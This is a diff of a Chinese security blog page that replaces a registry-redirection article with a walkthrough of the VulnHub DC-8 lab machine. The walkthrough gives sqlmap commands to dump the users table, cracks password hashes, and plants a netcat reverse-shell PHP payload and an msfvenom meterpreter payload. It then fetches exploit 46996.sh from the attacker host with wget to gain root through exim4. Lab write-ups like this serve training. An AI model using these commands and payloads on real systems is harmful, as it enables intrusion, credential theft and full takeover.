@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="注册表重定向, 域名之外">
-    <meta name="description" content="写合规基线规则会遇到注册表匹配不上的问题，这里就涉及到了注册表重定向。">
+    <meta name="keywords" content="VulnHub仿真靶机渗透之DC-8 【DC系列】, 域名之外">
+    <meta name="description" content="这次渗透是DC系列（VulnHub的仿真靶机）的DC-8，包含了sql注入、suid-exim4提权等知识。">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>注册表重定向 | 域名之外</title>
+    <title>VulnHub仿真靶机渗透之DC-8 【DC系列】 | 域名之外</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
     <style>
@@ -320,12 +320,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">注册表重定向</h1>
+                    <h1 class="description center-align post-title">VulnHub仿真靶机渗透之DC-8 【DC系列】</h1>
                 </div>
             </div>
         </div>
@@ -349,8 +349,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E5%90%88%E8%A7%84%E5%9F%BA%E7%BA%BF%E7%9B%B8%E5%85%B3/">
-                                <span class="chip bg-color">合规基线相关</span>
+                            <a href="/tags/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/">
+                                <span class="chip bg-color">DC系列靶机</span>
                             </a>
                         
                     </div>
@@ -361,8 +361,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E5%90%88%E8%A7%84%E5%9F%BA%E7%BA%BF/" class="post-category">
-                                合规基线
+                            <a href="/categories/%E4%BB%BF%E7%9C%9F%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" class="post-category">
+                                仿真靶机渗透
                             </a>
                         
                     </div>
@@ -374,7 +374,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2022-07-19
+                    2022-03-15
                 </div>
                 
 
@@ -395,45 +395,110 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>写合规基线规则会遇到注册表匹配不上的问题，这里就涉及到了注册表重定向。</p>
+                <p>这次渗透是DC系列（VulnHub的仿真靶机）的DC-8，包含了sql注入、suid-exim4提权等知识。</p>
 <span id="more"></span>
-<h1 id="重定向技术😊"><a href="#重定向技术😊" class="headerlink" title="重定向技术😊"></a>重定向技术😊</h1><h4 id="重定向技术适用版本："><a href="#重定向技术适用版本：" class="headerlink" title="重定向技术适用版本："></a>重定向技术适用版本：</h4><p>Windows XP X64、Windows Server 2003 X64及以后的X64版本。</p>
-<h4 id="重定向技术产生原因：为了确保32位程序能够顺利运行"><a href="#重定向技术产生原因：为了确保32位程序能够顺利运行" class="headerlink" title="重定向技术产生原因：为了确保32位程序能够顺利运行"></a>重定向技术产生原因：为了确保32位程序能够顺利运行</h4><p>为了将32位程序和64位程序分离开，产生了一种模拟器（WOW64，Windows 32 on Windows 64），WOW64 模拟器让我们可以在64位平台上运行32位程序，它在系统层中另外提供了一层，来支持老式的32位程序。</p>
-<h3 id="一：重定向-文件重定向"><a href="#一：重定向-文件重定向" class="headerlink" title="一：重定向-文件重定向"></a>一：重定向-文件重定向</h3><p>ps: 这种文件重定向对于每个32位应用程序默认打开的，但是也可以通过调用API关闭</p>
-<h4 id="文件重定向原因：为了确保32位程序能够顺利运行"><a href="#文件重定向原因：为了确保32位程序能够顺利运行" class="headerlink" title="文件重定向原因：为了确保32位程序能够顺利运行"></a>文件重定向原因：为了确保32位程序能够顺利运行</h4><p>windows对32位应用程序和64位应用程序有分开存放机制：</p>
-<p>对于64位，文件通常被放在%windir%\system32                和              %ProgramFiles%</p>
-<p>————-&gt;               C:\Windows\system32                           和                C:\program files。</p>
-<p>对于32位，文件通常被放在%windir%\syswow64                和              %ProgramFiles(x86)</p>
-<p>————-&gt;               C:\Windows\syswow64                          和              C:\program files (x86)。</p>
-<p>system32目录下都是64位的dll，只能支持64位程序使用，32位程序不能使用。而syswow64目录下都是32位的dll，可以支持32位程序使用。</p>
-<h4 id="文件重定向产生场景："><a href="#文件重定向产生场景：" class="headerlink" title="文件重定向产生场景："></a>文件重定向产生场景：</h4><p>32位程序访问%windir%\system32   或者  %ProgramFiles%   时候，会发生文件重定向。</p>
-<h4 id="文件重定向具体指向："><a href="#文件重定向具体指向：" class="headerlink" title="文件重定向具体指向："></a>文件重定向具体指向：</h4><p>%windir%\system32                      到                     %windir%\syswow64的重定向。</p>
-<p>%ProgramFiles%                           到                        C:\Program Files (x86)</p>
-<h4 id="文件重定向具体含义："><a href="#文件重定向具体含义：" class="headerlink" title="文件重定向具体含义："></a>文件重定向具体含义：</h4><p>32位应用程序去访问%windir%\system32，系统会自动跳转到%windir%\syswow64目录下面，syswow64目录下都是32位程序的dll，才能够让32位程序顺利加载【system32目录下面的64位dll不能让32位程序使用】。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/image-20220719173156334.png" alt="image-20220719173156334"></p>
-<h3 id="二：重定向-注册表重定向"><a href="#二：重定向-注册表重定向" class="headerlink" title="二：重定向-注册表重定向"></a>二：重定向-注册表重定向</h3><p>64位Windows的注册表分为 32 位注册表项和 64 位注册表项，许多 32 位注册表项与其相应的 64 位注册表项同名。<br>64 位版本的注册表编辑器中，32 位注册表项显示在 <code>HKEY_LOCAL_MACHINE\Software\WOW6432Node</code> 注册表项下。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/image-20220719175758828.png" alt="image-20220719175758828"></p>
-<p>打开64位注册表【运行-&gt;regedit】</p>
-<p>打开32位注册表【运行-&gt;%systemroot%\syswow64\regedit】</p>
-<h4 id="注册表重定向产生原因：防止注册表键冲突"><a href="#注册表重定向产生原因：防止注册表键冲突" class="headerlink" title="注册表重定向产生原因：防止注册表键冲突"></a>注册表重定向产生原因：防止注册表键冲突</h4><h4 id="注册表重定向实质：维护两套不同的注册表键【64位和32位】"><a href="#注册表重定向实质：维护两套不同的注册表键【64位和32位】" class="headerlink" title="注册表重定向实质：维护两套不同的注册表键【64位和32位】"></a>注册表重定向实质：维护两套不同的注册表键【64位和32位】</h4><p>ps：</p>
-<p><strong>注册表反射</strong>：【适用版本：windows xp、windows server2003等，从win7和winserver 2008 r2开始WOW64就不使用反射机制了，以前通过反射改的key都改为共享了】        维护两套不同的注册表重定向很多是通过：注册表反射机制完成的，但是不是所有的键值都会受到反射机制影响。</p>
-<p>​                      注册表反射是在64 位注册表视图和 32 位注册表视图之间<strong>复制</strong>某些特定的注册表项和项值。</p>
-<h4 id="注册表分类："><a href="#注册表分类：" class="headerlink" title="注册表分类："></a>注册表分类：</h4><p>1：专门给64位程序访问  【除了32位的都是】</p>
-<p>2：专门给32位程序访问  【HKEY_LOCAL_MACHINE\Software\WOW6432Node 路径下的】</p>
-<h4 id="注册表重定向具体举例："><a href="#注册表重定向具体举例：" class="headerlink" title="注册表重定向具体举例："></a>注册表重定向具体举例：</h4><p>应用程序操作注册表的时候32bit方式和64bit方式。运行于64bit系统下的32bit应用程序默认操作32位注册表项（即被重定向到WOW6432Node下的子项）；而64bit应用程序才是操作的直观子项。</p>
-<p>比如，同在64bit系统下，使用如下代码访问注册表：</p>
-<p>​    ::RegOpenKeyEx(HKEY_LOCAL_MACHINE,_T(“Software\Sobey\MPC “), 0,KEY_ALL_ACCESS, &amp;hKey)</p>
-<p>​    如果应用程序为32位子系统，那么实际访问的注册表位置为：HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Sobey\MPC；</p>
-<p>​    而如果应用程序为64位子系统，那么实际访问的注册表位置将会是：HKEY_LOCAL_MACHINE\SOFTWARE\Sobey\MPC。</p>
-<p>下面这个可以看到注册表具体项是哪个是反射、重定向还是共享，非常有用。</p>
-<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/winprog64/shared-registry-keys">WOW 下的重定向、共享和反射项 </a></p>
-<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/image-20220719183751494.png" alt="image-20220719183751494"></p>
-<p>参考链接：</p>
-<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/troubleshoot/windows-client/deployment/view-system-registry-with-64-bit-windows">64位视图注册表</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/diaomo9737/article/details/101724390?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0-101724390-blog-40922361.pc_relevant_multi_platform_whitelistv1&spm=1001.2101.3001.4242.1&utm_relevant_index=3">Windows:32位程序运行在64位系统上注册表会重定向</a></p>
-<p> <a target="_blank" rel="noopener" href="https://blog.csdn.net/jiangqin115/article/details/40922361">jiangqin115  - 注册表重定向</a></p>
-<p> <a target="_blank" rel="noopener" href="https://blog.csdn.net/mmthr/article/details/53932154">mmthr  -  32位程序访问64位  system32文件夹时注意事项</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/crazy_liyang/article/details/68302170">Crzayliyang-架构Young，64位Windows系统注册表的 32 位注册表项和64 位注册表项</a></p>
+<h1 id="VulnHub靶机渗透之DC-8-【DC系列】"><a href="#VulnHub靶机渗透之DC-8-【DC系列】" class="headerlink" title="VulnHub靶机渗透之DC-8 【DC系列】"></a>VulnHub靶机渗透之DC-8 【DC系列】</h1><p>dc8靶机下载链接：</p>
+<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-8,367/">https://www.vulnhub.com/entry/dc-8,367/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-9,412/">https://www.vulnhub.com/entry/dc-9,412/</a></p>
+<p>运行系统：kali+ dc-8</p>
+<p>平台：vmware workstation</p>
+<p>网络：均使用nat</p>
+<p>任务：拿到root权限，找到flag</p>
+<h4 id="发现主机-192-168-124-138"><a href="#发现主机-192-168-124-138" class="headerlink" title="发现主机-&gt;192.168.124.138"></a>发现主机-&gt;192.168.124.138</h4><p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647345903782.png" alt="1647345903782"></p>
+<h4 id="端口服务扫描-22-、80端口开放、robots-txt存在"><a href="#端口服务扫描-22-、80端口开放、robots-txt存在" class="headerlink" title="端口服务扫描-&gt; 22 、80端口开放、robots.txt存在"></a>端口服务扫描-&gt; 22 、80端口开放、robots.txt存在</h4><p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647346101133.png" alt="1647346101133"></p>
+<p>访问robots.txt找到登录界面</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.124.138/robots.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647346398409.png" alt="1647346398409"></p>
+<p>找到了用户登录地址</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647346384996.png" alt="1647346384996"></p>
+<p>找到sql注入点</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647346516480.png" alt="1647346516480"></p>
+<p>添加单引号，报错了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647346554962.png" alt="1647346554962"></p>
+<p>爆库</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap http://192.168.124.138/?nid=2 --dbs</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647346831712.png" alt="1647346831712"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647346782811.png" alt="1647346782811"></p>
+<p>爆表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap http://192.168.124.138/?nid=2 -D d7db --tables</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647347669192.png" alt="1647347669192"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647347650141.png" alt="1647347650141"></p>
+<p>爆字段</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap http://192.168.124.138/?nid=2 -D d7db -T users --columns</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647347817776.png" alt="1647347817776"><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647347854544.png" alt="1647347854544"></p>
+<p>脱裤</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap http://192.168.124.138/?nid=2 -D d7db -T users -C name,pass --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647347907155.png" alt="1647347907155"><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647347913104.png" alt="1647347913104"></p>
+<p>将密码hash保存到admin_john文件中，使用john破解</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin    $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z  </span><br><span class="line">john   $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647348203468.png" alt="1647348203468"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647348191525.png" alt="1647348191525"></p>
+<p>john爆破密码成功</p>
+<p>john&#x2F;turtle</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647348317269.png" alt="1647348317269"></p>
+<p>登录成功</p>
+<p>搜索网站一通，点击左上角content-&gt;点击edit-&gt;点击webforms-&gt;点击form settings-&gt;点击下拉框选择php code</p>
+<p>此处不能用一句话木马，而要反弹shell的payload，因为（此处无法找到路径所以用反弹shell）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647348562246.png" alt="1647348562246"></p>
+<p>上图无法利用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&quot;nc 192.168.124.134 1234 -e /bin/bash&quot;); ?&gt;</span><br><span class="line"></span><br><span class="line">nc是netcat命令，用于两台设别互相交互，-e参数表示当连接成功时在本机开启一个terminal，所有输入会传入到terminal上。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647349093843.png" alt="1647349093843"></p>
+<p>在网页随意提交一个评论，启动连接</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647349346066.png" alt="1647349346066"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647349197032.png" alt="1647349197032"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647349243171.png" alt="1647349243171"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647349452168.png" alt="1647349452168"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647349527873.png" alt="1647349527873"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647349544323.png" alt="1647349544323"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647353748558.png" alt="1647353748558"></p>
+<p>shell弹不出来，没办法了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647354007516.png" alt="1647354007516"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp  lhost=192.168.124.134 port=4444 -f raw </span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647354528255.png" alt="1647354528255"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647354500667.png" alt="1647354500667"></p>
+<p>通过发送邮件的方式来触发木马文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647354705116.png" alt="1647354705116"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647354753249.png" alt="1647354753249"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647354908315.png" alt="1647354908315"></p>
+<p>find查询带有suid权限的命令</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647354939385.png" alt="1647354939385"></p>
+<p>查看靶机exim4的版本【4.89】</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647355099264.png" alt="1647355099264"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647355027169.png" alt="1647355027169"></p>
+<p>使用exim4提权需要拥有写权限，tmp目录下写文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/local/46996.sh /tmp</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647355484535.png" alt="1647355484535"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.124.134:8000/46996.sh</span><br><span class="line">ls -l</span><br><span class="line">chmod +x 46996.sh</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647355476292.png" alt="1647355476292"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647355525099.png" alt="1647355525099"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647355611294.png" alt="1647355611294"></p>
+<p>成功</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./46996.sh -m netcat</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647355762990.png" alt="1647355762990"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44288604/article/details/122944302">https://blog.csdn.net/weixin_44288604/article/details/122944302</a> 【vulnhub之DC8靶机】</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42094992/article/details/109100082">https://blog.csdn.net/qq_42094992/article/details/109100082</a>  【入侵靶机DC-8】</p>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/46996">https://www.exploit-db.com/exploits/46996</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/allworldg/p/15158444.html">https://www.cnblogs.com/allworldg/p/15158444.html</a></p>
+<p>Vulnhub-DC8                <strong>龙蜀安全</strong></p>
 
                 
             </div>
@@ -460,7 +525,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://highgerms.github.io/2022/07/19/%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%87%8D%E5%AE%9A%E5%90%91/">http://highgerms.github.io/2022/07/19/%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%87%8D%E5%AE%9A%E5%90%91/</a>
+                    <a href="http://highgerms.github.io/2022/03/15/dc-8/">http://highgerms.github.io/2022/03/15/dc-8/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -498,8 +563,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E5%90%88%E8%A7%84%E5%9F%BA%E7%BA%BF%E7%9B%B8%E5%85%B3/">
-                                    <span class="chip bg-color">合规基线相关</span>
+                                <a href="/tags/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/">
+                                    <span class="chip bg-color">DC系列靶机</span>
                                 </a>
                             
                         </div>
@@ -549,31 +614,30 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2022/07/25/WIN+R%20%20%E5%AE%9E%E7%94%A8%E5%A4%A7%E6%80%BB%E7%BB%93/">
+                <a href="/2022/07/19/%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%87%8D%E5%AE%9A%E5%90%91/">
                     <div class="card-image">
                         
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="注册表重定向">
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="WIN+R实用大总结">
-                        
-                        <span class="card-title">WIN+R实用大总结</span>
+                        <span class="card-title">注册表重定向</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            将Windows的各种快捷键记熟会提高效率，我们cmd命令都运行结束了，有些傻孩子都还在找图形化界面入口。
+                            写合规基线规则会遇到注册表匹配不上的问题，这里就涉及到了注册表重定向。
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-07-25
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-07-19
                         </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%95%88%E7%8E%87%E6%8F%90%E5%8D%87%E6%8A%80%E5%B7%A7/" class="post-category">
-                                    效率提升技巧
+                            <a href="/categories/%E5%90%88%E8%A7%84%E5%9F%BA%E7%BA%BF/" class="post-category">
+                                    合规基线
                                 </a>
                             
                             
@@ -583,8 +647,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E6%95%88%E7%8E%87%E6%8F%90%E5%8D%87%E6%8A%80%E5%B7%A7/">
-                        <span class="chip bg-color">效率提升技巧</span>
+                    <a href="/tags/%E5%90%88%E8%A7%84%E5%9F%BA%E7%BA%BF%E7%9B%B8%E5%85%B3/">
+                        <span class="chip bg-color">合规基线相关</span>
                     </a>
                     
                 </div>
@@ -598,18 +662,18 @@
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/03/15/dc-8/">
+                <a href="/2022/03/15/dc-7/">
                     <div class="card-image">
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="VulnHub仿真靶机渗透之DC-8 【DC系列】">
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="VulnHub仿真靶机渗透之DC-7 【DC系列】">
                         
-                        <span class="card-title">VulnHub仿真靶机渗透之DC-8 【DC系列】</span>
+                        <span class="card-title">VulnHub仿真靶机渗透之DC-7 【DC系列】</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            这次渗透是DC系列（VulnHub的仿真靶机）的DC-8，包含了sql注入、suid-exim4提权等知识。
+                            这次渗透是DC系列（VulnHub的仿真靶机）的DC-7，包含了Drupal利用drush重置网站管理员密码、一句话木马Getshell、定时任务提权等知识。
                         
                     </div>
                     <div class="publish-info">
